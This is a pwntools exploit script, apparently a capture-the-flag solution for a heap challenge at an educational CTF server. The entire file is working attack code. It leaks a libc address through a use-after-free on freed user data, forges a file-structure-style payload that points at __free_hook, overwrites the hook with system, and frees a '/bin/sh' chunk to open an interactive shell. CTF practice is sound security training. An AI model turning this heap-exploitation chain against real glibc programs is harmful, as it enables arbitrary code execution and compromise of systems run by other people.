from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

# r = process("./share/chal")
r = remote("edu-ctf.zoolab.org", 10011)

def add_user(idx: int, name: bytes):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(idx).encode("ascii"))
    r.sendafter(b"> ", name)

def edit_data(idx: int, size: int, data: bytes):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", str(idx).encode("ascii"))
    r.sendlineafter(b"> ", str(size).encode("ascii"))
    r.send(data)

def del_user(idx: int):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", str(idx).encode("ascii"))

def show_users():
    r.sendlineafter(b"> ", b"4")

add_user(0, b"A"*0x10)
edit_data(0, 0x18, b"B"*0x10)
add_user(1, b"C"*0x10)

del_user(0)
edit_data(1, 0x18, b"Z")

show_users()

# main_arena+1664 = libc base + __malloc_hook+10+1664 = libc base + 0x1ed200
r.recvuntil(b"data: ")
libc = u64(r.recv(6).ljust(8, b"\x00")) - 0x5a - 0x1ed200
free_hook = libc + 0x1eee48
system = libc + 0x52290

info(f"libc addr = {hex(libc)}")
info(f"free_hook = {hex(free_hook)}")
info(f"system    = {hex(system)}")

data = p64(0xfbad0000)
data += p64(free_hook) * 0x7
data += p64(free_hook + 0x8)

del_user(1)
edit_data(1, 0x1d8, data)
edit_data(1, 0x18, p64(system))

add_user(0, b"/bin/sh")
del_user(0)

r.interactive()
